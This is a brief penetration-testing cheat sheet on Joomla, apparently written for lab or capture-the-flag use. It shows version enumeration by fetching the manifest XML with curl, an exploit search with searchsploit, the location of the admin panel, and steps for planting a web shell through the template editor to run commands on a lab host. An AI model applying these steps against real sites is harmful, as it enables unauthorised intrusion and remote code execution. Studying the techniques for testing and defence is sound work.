# Joomla

[Joomla](https://www.joomla.org/), is a free and open-source content management system (CMS) for publishing web content on websites. Web content applications include discussion forums, photo galleries, e-Commerce and user communities and numerous other web-based applications. 

This information was extracted from [Wikipedia](https://en.wikipedia.org/wiki/Joomla).


## Version Enumeration

The Joomla version can often be found at the location:

```
 /administrator/manifests/files/joomla.xml
```

Here is an example:

```sh
root@kali# curl -s 10.10.10.150/administrator/manifests/files/joomla.xml | head
<?xml version="1.0" encoding="UTF-8"?>
<extension version="3.6" type="file" method="upgrade">
        <name>files_joomla</name>
        <author>Joomla! Project</author>
        <authorEmail>admin@joomla.org</authorEmail>
        <authorUrl>www.joomla.org</authorUrl>
        <copyright>(C) 2005 - 2018 Open Source Matters. All rights reserved</copyright>
        <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
        <version>3.8.8</version>
        <creationDate>May 2018</creationDate>
```

The version is defined here:

```
<version>3.8.8</version>
```

If we find the version we can go ahead and look for exploits that match this version:

```
searchsploit joomla 3.8
```

## Admin Panel

The administrator panel can be located at this location:

```
/administrator
```

## Web Shells

We can attempt to go to  Extensions –> Template and create a new file which contains a webshell.

We can access this webshell from a path such as:

```
http://10.10.10.150/templates/beez3/sh3ll.php
```

We can do some RCE:

```
http://10.10.10.150/templates/beez3/sh3ll.php?param=id
```




